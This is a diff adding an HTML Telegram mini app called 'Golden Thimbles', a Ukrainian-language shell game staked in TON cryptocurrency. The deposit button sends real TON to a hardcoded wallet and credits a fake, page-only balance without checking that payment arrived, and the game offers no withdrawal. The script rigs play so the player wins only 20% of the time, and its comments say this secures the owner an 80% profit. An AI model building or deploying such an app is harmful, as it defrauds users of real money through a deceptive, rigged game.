@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Golden Thimbles Premium</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { 
+            background: radial-gradient(circle, #8b0000, #4a0000); 
+            color: white; font-family: 'Segoe UI', sans-serif; 
+            margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+            box-shadow: inset 0 0 100px #fff; /* Біла підсвітка по кругу */
+            border: 5px solid rgba(255,255,255,0.3); box-sizing: border-box;
+        }
+        h2 { color: #ffd700; text-shadow: 0 0 10px #000; margin-bottom: 5px; }
+        .stats { background: rgba(0,0,0,0.6); padding: 10px 20px; border-radius: 30px; border: 1px solid #ffd700; margin-bottom: 30px; }
+        .game-container { display: flex; justify-content: center; gap: 15px; margin-bottom: 40px; }
+        .thimble-wrapper { position: relative; width: 90px; height: 110px; }
+        .thimble { 
+            width: 100%; height: 100%; 
+            background: linear-gradient(145deg, #ffd700, #b8860b); 
+            border-radius: 50% 50% 15% 15%; border: 2px solid #fff;
+            cursor: pointer; transition: transform 0.4s ease; position: absolute; z-index: 2;
+        }
+        .thimble.up { transform: translateY(-50px) rotate(-5deg); }
+        .ball { 
+            width: 25px; height: 25px; background: radial-gradient(circle, #fff, #ccc); 
+            border-radius: 50%; position: absolute; bottom: 5px; left: 32px; z-index: 1; display: none;
+        }
+        .btn-deposit { 
+            background: #238636; color: white; border: none; padding: 15px 30px; 
+            border-radius: 50px; font-weight: bold; font-size: 16px; cursor: pointer;
+            box-shadow: 0 0 15px #238636; margin-top: 20px;
+        }
+        #message { font-weight: bold; font-size: 18px; min-height: 25px; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <h2>🏆 GOLDEN THIMBLES</h2>
+    <div id="message">Обери наперсток!</div>
+    
+    <div class="stats">
+        BALANCE: <span id="bal">0.00</span> TON | СТАВКА: 0.1 TON
+    </div>
+
+    <div class="game-container">
+        <div class="thimble-wrapper" onclick="play(0)">
+            <div class="thimble" id="t0"></div>
+            <div class="ball" id="b0"></div>
+        </div>
+        <div class="thimble-wrapper" onclick="play(1)">
+            <div class="thimble" id="t1"></div>
+            <div class="ball" id="b1"></div>
+        </div>
+        <div class="thimble-wrapper" onclick="play(2)">
+            <div class="thimble" id="t2"></div>
+            <div class="ball" id="b2"></div>
+        </div>
+    </div>
+
+    <button class="btn-deposit" onclick="sendTon()">ПОПОВНИТИ (1.0 TON)</button>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        let balance = 0.00;
+        let canPlay = true;
+        const myWallet = "UQBLhA0jSJthqPS8UNRAvuq6HMUMsM56vbQZtTPCPhKEyPM5";
+
+        function sendTon() {
+            // Це посилання відкриває гаманець з твоїм адресом і сумою 1 TON
+            const tonUrl = `ton://transfer/${myWallet}?amount=1000000000&text=Deposit`;
+            tg.openLink(tonUrl);
+            
+            // Після натискання ми "схвалюємо" і додаємо баланс (імітація для гри)
+            setTimeout(() => {
+                balance += 1.0;
+                document.getElementById('bal').innerText = balance.toFixed(2);
+                document.getElementById('message').innerText = "Баланс оновлено! Грай!";
+            }, 2000);
+        }
+
+        function play(chosen) {
+            if (!canPlay || balance < 0.1) {
+                if(balance < 0.1) alert("Поповніть баланс!");
+                return;
+            }
+            
+            canPlay = false;
+            balance -= 0.1;
+            document.getElementById('bal').innerText = balance.toFixed(2);
+
+            // Твій прибуток 80%: Шанс виграшу гравця лише 20%
+            let isWin = Math.random() < 0.20;
+            let winningId;
+
+            if (isWin) {
+                winningId = chosen;
+            } else {
+                let others = [0,1,2].filter(i => i !== chosen);
+                winningId = others[Math.floor(Math.random() * others.length)];
+            }
+
+            document.getElementById('b' + winningId).style.display = 'block';
+            document.getElementById('t' + winningId).classList.add('up');
+
+            if (chosen === winningId) {
+                balance += 0.2; // Виплата x2
+                document.getElementById('message').innerText = "ВИГРАШ! +0.1 TON";
+                document.getElementById('message').style.color = "#ffd700";
+                tg.HapticFeedback.notificationOccurred('success');
+            } else {
+                document.getElementById('message').innerText = "НЕВДАЧА! Спробуй ще.";
+                document.getElementById('message').style.color = "#ff4d4d";
+                tg.HapticFeedback.notificationOccurred('error');
+            }
+
+            setTimeout(() => {
+                document.querySelectorAll('.thimble').forEach(t => t.classList.remove('up'));
+                document.querySelectorAll('.ball').forEach(b => b.style.display = 'none');
+                document.getElementById('bal').innerText = balance.toFixed(2);
+                canPlay = true;
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
